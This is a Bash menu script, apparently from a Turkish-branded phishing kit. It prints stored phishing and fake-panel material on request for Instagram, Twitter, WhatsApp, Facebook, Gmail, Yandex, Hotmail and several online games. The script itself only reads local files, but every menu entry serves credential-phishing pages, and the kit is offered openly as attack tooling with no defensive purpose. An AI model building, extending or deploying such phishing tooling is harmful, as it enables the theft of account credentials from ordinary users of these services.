#!/bin/bash
clear
echo -e  "


\e[35m     ((( #Türk Siber Timi  #Yaman Efkar )))


"

echo -e "\e[31m"
read -p "Kodunuzu  Yazınız: " islem
if [[ $islem == "insta01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Instagram/Instagram-phishing/username-phishing.txt

elif [[ $islem == "insta02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Instagram/Instagram-fakepanel/username-fakepanel.txt

elif [[ $islem == "twitter01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Twitter/Site-phishing/user.txt

elif [[ $islem == "twitter02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Twitter/Site-fakepanel/twitter.txt

elif [[ $islem == "whatsapp01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Whatsapp/Site/code.txt

elif [[ $islem == "face01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Facebook/Site-facebook/facebook.txt

elif [[ $islem == "face02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Facebook/Site-fakepanel/fakepanel.txt
elif [[ $islem == "mail01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-gmail/gmail.txt

elif [[ $islem == "mail02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-yandex/yandex.txt

elif [[ $islem == "mail03" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Mail/Site-hotmail/hotmail.txt

elif [[ $islem == "game01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Game/Site-wolfteam/wolfteam.txt

elif [[ $islem == "game02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Game/Site-legend/legendonline.txt

elif [[ $islem == "game03" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Game/Site-pubg/pubg.txt

elif [[ $islem == "game04" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Game/Site-zula/zula.txt

elif [[ $islem == "game05" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cat Game/Site-lol/lol.txt
else
	clear
        echo -e "\e[31mYanlış Kod Girdiniz...."
	sleep 3
        bash code.sh
fi
echo -e "\e[31m"
read -p "Ana Menüye Dönmek İçin Entere Basınız...." non
cd ..
bash tst.sh
